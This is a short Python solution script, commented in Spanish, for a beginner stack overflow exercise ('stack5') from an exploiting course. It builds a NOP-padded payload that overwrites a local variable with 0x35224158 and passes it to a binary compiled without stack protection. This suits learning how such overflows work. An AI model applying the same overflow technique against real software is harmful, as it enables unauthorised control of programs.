#Solucion stack5 http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/011%20stack8.idb/Soluciones/
#Esta solucion se desarrollo en linux Ubuntu 14.04 64 bits
#Se elimino #include "stdafx.h" del codigo fuente y se compilo con:
#gcc -m32 -fno-stack-protector -z execstack -fpermissive stack5.cpp -o stack5

import subprocess
import struct

#Segun ida con 52 bytes deberia ser suficiente para pizar var_8 en el stack, pero en la practica necesite de 150
buff = '\x90' * 150 
#Estos 2 valores son los argumentos de la funcion check()
var_8 = struct.pack("<I", 0x35224158)
var_4 = "JUNK" # => 'Basura, la necesitamos para entrar a check()'
#Esta funcion checkea que el valor de var_8 sea igual a 0x71725553 si esto se cumple le suma el valor de var_4
#Esto con el objetivo de que en main se cumpla el if (cookie == 0x35224158)
#La funcion check en realidad es un enganio ya que si nos centramos en cumplir estos requisitos deberiamos lograr que
#var_4 sea un numero negativo para que *_cookie += _cookie2; (var_8 y var_4 respectivamente) den como resultado 0x35224158
#El truco esta en sobre escribir el valor de var_8 con 0x35224158 para luego entrar a la funcion check() no entrar al if y retornar
#logrando EAX guarde el valor de var_8 (0x35224158) y lograr q la comparcion 
#cmp     eax, 35224158h => Inside Main()
#dentro de la funcion Main() se cumpla

payload = buff + var_8 + var_4

subprocess.call(["./stack5", payload])
